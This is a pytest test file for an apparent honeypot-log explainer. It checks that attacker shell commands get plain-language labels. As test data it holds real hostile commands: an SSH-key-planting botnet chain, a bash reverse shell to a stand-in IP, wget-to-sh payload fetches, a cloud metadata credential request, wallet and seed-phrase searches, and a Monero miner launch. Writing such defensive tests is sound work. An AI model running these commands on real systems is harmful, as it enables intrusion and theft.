"""Command explanations — cases taken from real samovar traffic (Nov 2026)."""
import pytest

import explain

MDRFCKR = ('cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2E mdrfckr">>.ssh/authorized_keys'
           ' && chmod -R go= ~/.ssh && cd ~')


@pytest.mark.parametrize("cmd, expected", [
    ("cd ~; chattr -ia .ssh; lockr -ia .ssh", "[mdrfckr SSH-key botnet] unlocks ~/.ssh"),
    (MDRFCKR, "[mdrfckr SSH-key botnet] wipes existing SSH keys → plants its own SSH key → locks down ~/.ssh"),
    ("uname -a", "identifies the OS"),
    ("cat /proc/cpuinfo | grep name | wc -l", "counts CPU cores"),
    ("ls -lh $(which ls)", "checks for tampered binaries"),
    ("Enter new UNIX password:", "types blindly into a password prompt"),
    ("locate D877F783D5D3EF8Cs", "[Telegram session stealer] hunts for Telegram session files"),
    ("/ip cloud print", "tries MikroTik router commands"),
    ("ps | grep '[Mm]iner'", "checks for a rival miner"),
    ("echo 'check_67aa2d7a77f83477a70f9694787c05f3_small_math|'\"$((617*742+58))\"",
     "[honeypot-detection probe] echoes random tokens to spot a fake shell → tests if the shell really does arithmetic"),
    ("ls -d /home/cowrie /opt/cowrie /srv/cowrie 2 > /dev/null | head -1",
     "[honeypot hunter] looks for honeypot software (Cowrie)"),
    ("rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; echo > /etc/hosts.deny",
     "[rival-cleanup dropper] kills competing processes → clears the IP blocklist (hosts.deny)"),
    ("echo xsec", "echoes a marker to confirm the login works"),
])
def test_real_commands(cmd, expected):
    assert explain.explain(cmd) == expected


def test_reading_etc_passwd_is_not_changing_the_password():
    assert "changes the root password" not in explain.steps("cat /etc/passwd | grep root")
    assert "changes the root password" in explain.steps('echo -e "x\\nx"|passwd|bash')


def test_grepping_for_miner_names_is_not_a_miner():
    scan = "grep -rEl 'wallet\\.dat|mnemonic|xmrig|nanopool|supportxmr' /root /home"
    assert explain.campaign(scan) is None
    assert "searches files for secrets (seed phrases, API keys)" in explain.steps(scan)
    assert explain.campaign("./xmrig -o pool.supportxmr.com:443 -u 4AbC") == "Monero miner"


def test_raw_socket_download_is_not_a_reverse_shell():
    dl = "exec 6<>/dev/tcp/1.2.3.4/8981 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/x"
    assert "opens a reverse shell" not in explain.steps(dl)
    assert "opens a reverse shell" in explain.steps("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")


def test_specific_label_suppresses_vague_one():
    s = explain.steps("wget http://1.2.3.4/x.sh -O- | sh")
    assert "downloads a payload" in s and "fetches something from the internet" not in s
    meta = explain.steps("curl -s -X PUT http://169.254.169.254/latest/api/token")
    assert meta == ["asks the cloud metadata service for credentials"]


def test_long_chains_are_capped_and_unknown_is_none():
    out = explain.explain("whoami; hostname; uname -a; nproc; free -m; df -h; uptime")
    assert out.count("→") == 3 and out.endswith("(+3 more)")
    assert explain.explain("some_custom_thing --flag") is None
    assert explain.explain("") is None
